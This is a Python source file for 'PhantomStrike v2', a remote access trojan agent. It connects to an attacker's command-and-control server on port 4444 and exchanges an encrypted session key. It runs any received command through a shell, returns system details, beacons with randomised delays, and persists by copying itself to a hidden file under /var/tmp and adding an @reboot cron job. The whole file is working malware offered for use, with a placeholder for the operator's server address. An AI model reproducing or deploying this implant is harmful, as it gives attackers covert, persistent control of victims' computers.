#!/usr/bin/env python3
"""
PhantomStrike v2 - Agent (Web Panel Compatible)
Fileless | Reconnect | Jitter | Sysinfo | Persistence
"""

import socket
import subprocess
import os
import time
import base64
import platform
import random
import json
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# === CONFIG ===
C2_HOST = "YOUR_C2_IP"          # CHANGE TO YOUR C2 SERVER IP
C2_PORT = 4444
SLEEP_MIN, SLEEP_MAX = 3, 8      # Beacon jitter (seconds)
RETRY_DELAY = 5

# === C2 PUBLIC KEY (Paste from web_panel.py output) ===
C2_PUB_KEY_PEM = """
-----BEGIN PUBLIC KEY-----
Paste_the_output_from_web_panel_here
-----END PUBLIC KEY-----
"""

# === Helpers ===
def jitter_sleep():
    time.sleep(random.randint(SLEEP_MIN, SLEEP_MAX))

def run_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
        return result.decode(errors='ignore').strip()
    except subprocess.TimeoutExpired:
        return "[!] Command timed out."
    except Exception as e:
        return f"[-] Error: {e}"

def get_sysinfo():
    try:
        user = os.getlogin() if hasattr(os, 'getlogin') else os.getenv("USER", "unknown")
    except:
        user = "unknown"
    return json.dumps({
        "host": platform.node(),
        "user": user,
        "os": f"{platform.system()} {platform.release()}",
        "arch": platform.machine(),
        "pid": os.getpid()
    })

# === Encryption ===
def encrypt_aes(key, data):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

# === Main Agent Loop ===
def main():
    pubkey = RSA.import_key(C2_PUB_KEY_PEM)
    aes_key = get_random_bytes(16)

    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((C2_HOST, C2_PORT))

            # Step 1: Send encrypted AES key
            enc_aes_key = pubkey.encrypt(aes_key, 32)[0]
            s.send(enc_aes_key)

            print(f"[+] Connected to {C2_HOST}:{C2_PORT}")

            while True:
                try:
                    enc_cmd = s.recv(4096).decode()
                    if not enc_cmd:
                        break

                    # Decrypt command
                    raw = base64.b64decode(enc_cmd)
                    nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
                    cipher = AES.new(aes_key, AES.MODE_EAX, nonce=nonce)
                    command = cipher.decrypt_and_verify(ciphertext, tag).decode().strip()

                    # Handle special commands
                    if command == "sysinfo":
                        output = get_sysinfo()
                    elif command == "exit":
                        s.close()
                        print("[+] Exit command received.")
                        return
                    else:
                        output = run_command(command)

                    # Send result
                    enc_out = encrypt_aes(aes_key, output)
                    s.send(enc_out.encode())

                except (socket.timeout, ConnectionResetError, BrokenPipeError):
                    break
                except Exception as e:
                    try:
                        err = encrypt_aes(aes_key, f"[-] Agent error: {e}")
                        s.send(err.encode())
                    except:
                        break

        except Exception as e:
            if s:
                s.close()
            print(f"[-] Connection failed: {e}. Retrying in {RETRY_DELAY}s...")

        jitter_sleep()

# === Persistence (Linux) ===
def add_persistence():
    if os.getuid() != 0:
        print("[!] Persistence requires root. Skipping.")
        return

    agent_path = "/var/tmp/.phantom"
    cron_job = f"@reboot python3 {agent_path} > /dev/null 2>&1\n"

    try:
        with open(agent_path, "w") as f:
            f.write(open(__file__).read())
        os.chmod(agent_path, 0o700)

        current_cron = subprocess.getoutput("crontab -l 2>/dev/null || true")
        if cron_job not in current_cron:
            updated_cron = current_cron + cron_job if current_cron else cron_job
            subprocess.run("crontab", input=updated_cron.encode(), check=True)
            print(f"[+] Persistence added: {agent_path}")
    except Exception as e:
        print(f"[-] Persistence failed: {e}")

# === Entry Point ===
if __name__ == "__main__":
    print("""
██████╗ ██╗  ██╗ █████╗ ███╗   ███╗ ████████╗ ███████╗
██╔══██╗██║  ██║██╔══██╗████╗ ████║ ╚══██╔══╝ ██╔════╝
██████╔╝███████║███████║██╔████╔██║    ██║    █████╗  
██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║    ██║    ██╔══╝  
██║     ██║  ██║██║  ██║██║ ╚═╝ ██║    ██║    ███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝    ╚══════╝
           PhantomStrike - Agent (Web Panel)
                              by @Akkaiaj
""")
    add_persistence()
    main()
